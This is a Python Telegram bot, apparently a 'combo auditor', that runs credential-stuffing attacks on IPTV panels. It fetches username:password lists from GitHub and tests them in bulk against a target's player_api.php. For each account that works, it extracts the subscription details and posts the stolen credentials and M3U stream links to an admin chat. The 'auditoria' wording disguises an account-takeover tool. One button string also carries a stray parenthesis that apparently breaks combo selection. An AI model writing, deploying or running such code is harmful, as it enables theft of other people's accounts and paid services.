# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from dotenv import load_dotenv

load_dotenv()

# ==========================================
# 👻 SERVIDOR FANTASMA PARA O RENDER (PORTA WEB)
# ==========================================
class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot do Giovani Rodando com Sucesso!")

def iniciar_servidor_web():
    porta = int(os.environ.get("PORT", 10000))
    servidor = HTTPServer(("0.0.0.0", porta), DummyHandler)
    servidor.serve_forever()

threading.Thread(target=iniciar_servidor_web, daemon=True).start()

import asyncio
import re
import time
import json
import nest_asyncio
import aiohttp
from datetime import datetime
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, MessageHandler, CallbackQueryHandler, CommandHandler, ContextTypes, filters
)

# ==========================================
# 🛡️ CONFIGURAÇÕES E CREDENCIAIS
# ==========================================
TOKEN = os.getenv("TELEGRAM_TOKEN")
if not TOKEN:
    sys.exit(1)

# Substitua ou ajuste os links abaixo conforme os nomes dos arquivos que você subiu no seu repositório novo do GitHub
LINKS_COMBOS_GITHUB = {
    "FENIX V4 ULTRA": "https://raw.githubusercontent.com/giova010878-coder/SEU_NOVO_REPO/refs/heads/main/combos/fenix_v4.txt",
    "XAKKAL V²": "https://raw.githubusercontent.com/giova010878-coder/SEU_NOVO_REPO/refs/heads/main/combos/xakkal_v2.txt",
    "DERRUBA DNS": "https://raw.githubusercontent.com/giova010878-coder/SEU_NOVO_REPO/refs/heads/main/combos/derruba_dns.txt",
}

HEADERS = {"User-Agent": "VLC", "X-User-Agent": "Model: MAG254; Link: Ethernet"}

# Lê os administradores do .env ou usa o padrão
admin_env = os.getenv("ADMIN_IDS", "7679881390")
ADMIN_IDS = [int(x.strip()) for x in admin_env.split(",")]

scans_ativos = {}
dados_temporarios = {}

# ==========================================
# 🛰️ PUXADOR DE COMBOS DO GITHUB
# ==========================================
async def puxar_combo_especifico(link):
    combos_totais = []
    headers_github = {"User-Agent": "Mozilla/5.0"}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(link, headers=headers_github, timeout=20) as r:
                if r.status == 200:
                    texto = await r.text()
                    for linha in texto.split('\n'):
                        linha_limpa = linha.strip()
                        if not linha_limpa or linha_limpa.startswith("#"):
                            continue
                        
                        separadores = [":", "|", ";", " "]
                        user, pwd = None, None
                        
                        for sep in separadores:
                            if sep in linha_limpa:
                                partes = linha_limpa.split(sep, 1)
                                if len(partes) == 2:
                                    user = partes[0].strip()
                                    pwd = partes[1].strip()
                                    break
                        
                        if user and pwd:
                            combos_totais.append((user, pwd))
        except Exception as e:
            print(f"⚠️ Erro ao puxar combo do GitHub: {e}")
            
    return list(set(combos_totais))

# ==========================================
# 🎯 EXTRACÃO PROFUNDA COM CONEXÕES
# ==========================================
async def extracao_profunda(session, dns, user, password):
    url_base = f"http://{dns}/player_api.php?username={user}&password={password}"
    urls = {
        "info": url_base,
        "tv": f"{url_base}&action=get_live_streams",
        "vod": f"{url_base}&action=get_vod_streams",
        "series": f"{url_base}&action=get_series"
    }

    async def fetch(chave, url):
        try:
            async with session.get(url, headers=HEADERS, timeout=10) as r:
                if r.status == 200:
                    try: return chave, await r.json()
                    except: return chave, None
        except: return chave, None
        return chave, None

    tarefas = [fetch(k, v) for k, v in urls.items()]
    resultados = await asyncio.gather(*tarefas)
    dados = {k: v for k, v in resultados}

    info_json = dados.get("info") or {}
    status_conta = "Inativo"
    exp_date_str = "N/A"
    dias_restantes = 0
    max_connections = "N/A"
    active_connections = "N/A"

    if "user_info" in info_json:
        u_info = info_json["user_info"]
        if str(u_info.get("status", "")).lower() in ["active", "1", "true"]:
            status_conta = "Ativo"
        
        timestamp_exp = u_info.get("exp_date")
        if timestamp_exp and str(timestamp_exp).isdigit():
            dt_exp = datetime.fromtimestamp(int(timestamp_exp))
            exp_date_str = dt_exp.strftime("%d/%m/%Y")
            dias_restantes = (dt_exp - datetime.now()).days
            if dias_restantes < 0: dias_restantes = 0

        max_connections = u_info.get("max_connections", "N/A")
        active_connections = u_info.get("active_cons", "0")

    tv_count = len(dados.get("tv") or [])
    vod_count = len(dados.get("vod") or [])
    series_count = len(dados.get("series") or [])

    return {
        "valido": (status_conta == "Ativo"),
        "status": status_conta,
        "expiracao": exp_date_str,
        "dias": dias_restantes,
        "max_conn": max_connections,
        "active_conn": active_connections,
        "tv": tv_count,
        "vod": vod_count,
        "series": series_count
    }

# ==========================================
# 🚀 MOTOR DE TESTE RÁPIDO DE COMBO
# ==========================================
async def testar_combo(session, dns, user, password):
    url_base = f"http://{dns}/player_api.php?username={user}&password={password}"
    try:
        async with session.get(url_base, headers=HEADERS, timeout=3.0) as r:
            if r.status == 200:
                texto = await r.text()
                if '"status":"Active"' in texto or '"status":"active"' in texto:
                    return True
    except: pass
    return False

# ==========================================
# 🔍 PROCESSAMENTO DA AUDITORIA
# ==========================================
async def processar_auditoria(dns_alvo, nome_combo, link_combo, chat_id, context):
    dns_alvo = re.sub(r'https?://', '', dns_alvo).split('/')[0].strip().lower()

    msg = await context.bot.send_message(chat_id, f"📥 **Baixando combo `{nome_combo}`** do GitHub...")

    combos = await puxar_combo_especifico(link_combo)
    if not combos:
        await msg.edit_text(f"❌ Nenhum usuário e senha encontrado no arquivo `{nome_combo}`.")
        return

    total_combos = len(combos)
    scans_ativos[chat_id] = True

    teclado_parar = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 PARAR AUDITORIA", callback_data="parar_scan")]])
    
    try:
        await msg.edit_text(f"🔍 **Iniciando varredura** usando `{nome_combo}` ({total_combos} combinações) no painel `{dns_alvo}`...", reply_markup=teclado_parar)
    except:
        pass

    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    contas_validas = []
    testados = 0
    ultima_porcentagem_atualizada = -1

    async with aiohttp.ClientSession(connector=connector) as session:
        lote_tamanho = 50
        for i in range(0, total_combos, lote_tamanho):
            if not scans_ativos.get(chat_id, False):
                break

            lote = combos[i:i+lote_tamanho]
            tarefas = [testar_combo(session, dns_alvo, user, pwd) for user, pwd in lote]
            resultados = await asyncio.gather(*tarefas)

            for idx, valido in enumerate(resultados):
                testados += 1
                if valido:
                    user, pwd = lote[idx]
                    detalhes = await extracao_profunda(session, dns_alvo, user, pwd)
                    contas_validas.append((user, pwd, detalhes))

            porcentagem = int((testados / total_combos) * 100)
            if porcentagem != ultima_porcentagem_atualizada and (porcentagem % 5 == 0 or testados == total_combos):
                ultima_porcentagem_atualizada = porcentagem
                blocos_cheios = int(porcentagem / 10)
                blocos_vazios = 10 - blocos_cheios
                barra = "█" * blocos_cheios + "░" * blocos_vazios
                
                texto_progresso = (
                    f"⚡ **AUDITORIA ({nome_combo})** ⚡\n"
                    f"📡 Servidor: `{dns_alvo}`\n\n"
                    f"[{barra}] {porcentagem}%\n"
                    f"📊 Testados: `{testados}/{total_combos}`\n"
                    f"✅ Válidas achadas: `{len(contas_validas)}`"
                )
                try:
                    await msg.edit_text(texto_progresso, parse_mode="Markdown", reply_markup=teclado_parar)
                except:
                    pass

    scans_ativos.pop(chat_id, None)

    try:
        await msg.delete()
    except:
        pass

    if not contas_validas:
        await context.bot.send_message(chat_id, f"🛑 **Fim da auditoria com `{nome_combo}`** para `{dns_alvo}`.\nNenhuma conta válida foi encontrada.")
        return

    for user, pwd, det in contas_validas:
        m3u_limpo = f"http://{dns_alvo}/get.php?username={user}&password={pwd}&type=m3u_plus&output=ts"
        
        layout = (
            f"🎯 **NOVO HIT ENCONTRADO!**\n\n"
            f"🌐 **Servidor:** `http://{dns_alvo}`\n"
            f"👤 **Usuário:** `{user}`\n"
            f"🔑 **Senha:** `{pwd}`\n\n"
            f"🟢 **Status:** `{det['status']}`\n"
            f"⏳ **Expiração:** `{det['expiracao']}` ({det['dias']} dias restantes)\n"
            f"🔌 **Conexões:** `{det['active_conn']} / {det['max_conn']}`\n\n"
            f"📦 **Conteúdo Disponível:**\n"
            f"  • 📺 Canais: `{det['tv']}`\n"
            f"  • 🎬 Filmes: `{det['vod']}`\n"
            f"  • 🍿 Séries: `{det['series']}`\n\n"
            f"🔗 **Link M3U:**\n`{m3u_limpo}`\n\n"
            f"📂 *Base:* `{nome_combo}`"
        )
        await context.bot.send_message(chat_id, layout, parse_mode="Markdown")

# ==========================================
# 🎛️ GERENCIAMENTO DE BOTÕES E COMANDOS
# ==========================================
async def botoes_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id

    if user_id not in ADMIN_IDS:
        await query.answer("⛔️ Acesso negado.", show_alert=True)
        return

    data = query.data

    if data == "parar_scan":
        scans_ativos[chat_id] = False
        await query.answer("🛑 Auditoria cancelada!", show_alert=True)
        try:
            await query.edit_message_text("🛑 **Auditoria cancelada pelo usuário.**")
        except:
            pass
    elif data.startswith("combo_"):
        nome_escolhido = data.replace("combo_", "")
        link_escolhido = LINKS_COMBOS_GITHUB.get(nome_escolhido)
        dns_alvo = dados_temporarios.get(chat_id)

        if not dns_alvo or not link_escolhido:
            await query.answer("⚠️ Erro: Dados expirados. Envie o painel novamente.", show_alert=True)
            return

        await query.answer(f"🚀 Combo '{nome_escolhido}' selecionado!")
        try:
            await query.message.delete()
        except:
            pass

        asyncio.create_task(processar_auditoria(dns_alvo, nome_escolhido, link_escolhido, chat_id, context))

async def comando_parar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔️ Acesso negado.")
        return

    if scans_ativos.get(chat_id, False):
        scans_ativos[chat_id] = False
        await update.message.reply_text("🛑 Comando `/parar` executado! O scan será encerrado.")
    else:
        await update.message.reply_text("⚠️ Não há nenhuma auditoria rodando no momento.")

async def receber_texto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text
    user_id = update.message.from_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔️ Acesso negado.")
        return

    if msg and ("." in msg or "http" in msg) and not msg.startswith("/"):
        chat_id = update.message.chat_id
        if scans_ativos.get(chat_id, False):
            await update.message.reply_text("⚠️ Já existe uma auditoria rodando! Envie `/parar` antes de iniciar outra.")
            return

        dados_temporarios[chat_id] = msg

        teclado_combos = []
        for nome in LINKS_COMBOS_GITHUB.keys():
            teclado_combos.append([InlineKeyboardButton(f"📂 Usar: {nome}", callback_data=f"combo_{nome})")])

        reply_markup = InlineKeyboardMarkup(teclado_combos)
        await update.message.reply_text(
            f"🎯 **Painel Alvo Recebido:** `{msg}`\n\nEscolha abaixo qual arquivo de combo você deseja usar para esta auditoria:",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )

def main():
    nest_asyncio.apply()
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("parar", comando_parar))
    app.add_handler(CallbackQueryHandler(botoes_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), receber_texto))
    
    print("🎯 GIOVANI COMBO AUDITOR ONLINE")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
